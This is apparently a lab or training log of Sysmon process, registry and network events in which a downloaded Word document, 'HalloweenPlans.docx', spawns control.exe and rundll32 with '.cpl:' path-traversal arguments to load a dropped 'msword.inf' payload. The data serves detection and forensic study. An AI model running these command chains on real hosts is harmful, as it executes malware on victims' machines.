{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../AppData/Local/Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../AppData/Local/Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:../../../AppData/Local/Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../AppData/Local/Temp/Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../AppData/Local/Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../AppData/Local/Temp/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../AppData/Local/Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" \"C:\\Windows\\system32\\shell32.dll\",#44 \".cpl:../../../AppData/Local/Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../AppData/Local/Temp/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../AppData/Local/Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../AppData/Local/Temp/Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:../../../../AppData/Local/Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../AppData/Local/Temp/Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"rundll32.exe","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" \"C:\\Windows\\system32\\shell32.dll\",#44 \".cpl:../../../AppData/Local/Temp/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../AppData/Local/Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../AppData/Local/Temp/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../../Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:../../../../AppData/Local/Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../AppData/Local/Temp/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../../Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../../Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../../Temp/Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:../../../../../Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../../Temp/Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../../Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../../../Temp/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:41","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:../../../../../Temp/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../../../Temp/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:../../Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:42","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:../../msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:43","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:43","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:43","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:43","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\BackgroundTransferHost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:44","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:44","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
